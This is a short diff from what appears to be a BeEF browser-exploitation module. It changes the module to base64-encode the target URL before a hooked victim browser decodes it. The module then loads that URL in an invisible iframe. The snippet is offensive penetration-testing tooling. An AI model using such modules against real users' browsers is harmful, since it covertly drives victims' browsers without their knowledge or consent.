@@ -6,7 +6,7 @@
 
 beef.execute(function() {
 
-	var target = "<%= @target %>";
+	var target = decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@target) %>'));
 	var iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
 	iframe_<%= @command_id %>.setAttribute('src', target);
 
